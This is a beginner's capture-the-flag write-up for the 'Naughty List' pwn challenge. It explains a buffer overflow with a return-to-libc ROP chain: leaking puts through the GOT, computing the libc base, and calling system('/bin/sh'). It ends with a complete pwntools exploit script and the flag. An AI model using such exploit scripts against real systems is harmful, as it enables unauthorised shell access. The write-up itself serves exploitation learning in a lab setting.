# Naughty List  (Day 3)

NOTE: I like this series of pwn challenges because they really build upon one another and were very suitable for a beginner like me. I didn't finish this challenge within the allocated time but I learnt alot from it about Return Oriented Programming (ROP) and so I decided to detail the steps here.

We are given a file called **naughty_list** with the following security permissions: 

![checksec](https://user-images.githubusercontent.com/71312079/153104565-32743267-1ce2-459f-864e-deb0a41c7bec.png)

Hmm.. this is similar to [Day 1's](../Mr%20Snowy/README.md) challenge, with the exception that there is no function we can jump to within the binary in order to obtain the flag. The presence of a [libc](libc.so.6) file also is a clear sign that this is likely a **return to libc** attack.

Running the file, I receive the following prompt
![naughty](https://user-images.githubusercontent.com/71312079/153110378-bca2eaea-3647-41d7-9362-c98df0832559.png)

After keying in some inputs (highlighted in yellow), I see the **segmentation fault** and can confirm that the program is vulnerable to a buffer overflow.

Given that the stack is not executable, we need to use a sequence of ROP gadgets in order to:
1. Leak the address of a libc function (*'puts'* in this case)
2. Return back to the **get_descr** function (So we don't have to type in name/surname/age again)
3. Find the libc base address
4. Find the **/bin/sh** string
5. Find the **system** command to execute **/bin.sh**
6. Obtain shell on the server and retrieve the flag

**get_descr decompiled view in Ghidra**
![get_desc](https://user-images.githubusercontent.com/71312079/153110380-b6c1b3e7-eec8-458a-890e-2ccacc93007c.png)

Prior to exploitation, I performed the following steps:
* Used [ropper](https://github.com/sashs/Ropper) to find  2 gadgets
  *  **'pop rdi; ret;'** - enables the address of the *puts* function in our file to be leaked
  *  **'ret;'** - aligns the stack so the *system* function can be properly called in our 2nd buffer overflow
* Created a patched file **naughty_list_patched** with the supplied libc file using [pwninit](https://github.com/io12/pwninit) for local testing

Below is the full solution with comments.
```python
from pwn import *

e = context.binary = ELF('./naughty_list_patched', checksec=False)
#r = remote('178.128.35.132', 32273)
l = ELF('./libc.so.6', checksec=False)
r = process('./naughty_list_patched')

ret = 0x400756 # ret;
pop_rdi = 0x401443 # pop rdi; ret;
# Addresses taken from ropper 

r.sendlineafter(':', 'name')
r.sendlineafter(':', 'surname')
r.sendlineafter(':', '20')

buf = b'A' * 0x28 
# Offset determined using gef 
buf += p64(pop_rdi) 
buf += p64(e.got['puts'])
# Address of 'puts' from GOT gets popped into the RDI
buf += p64(e.plt['puts'])
# Prints out the address of 'puts' as it is in the RDI
buf += p64(e.symbols['get_descr'])
# Return back to the get_descr function 

r.sendline(buf)
r.recvuntil('will take a better look and hopefuly you will get your')
r.recvline()

libc_puts = u64(r.recvline()[:-1].ljust(8, b'\x00'))
# Received address is padded to 8 bytes since this is a 64-bit executable
libc_base = libc_puts - l.symbols['puts']
#l.symbols['puts'] will be an offset from the libc_base

buf = b'A' * 0x28 
buf += p64(pop_rdi)
buf += p64(libc_base + next(l.search(b"/bin/sh")))
buf += p64(ret) 
buf += p64(libc_base + l.symbols['system'])

r.sendline(buf)
r.interactive()
r.close()
```
FLAG: `HTB{u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft}`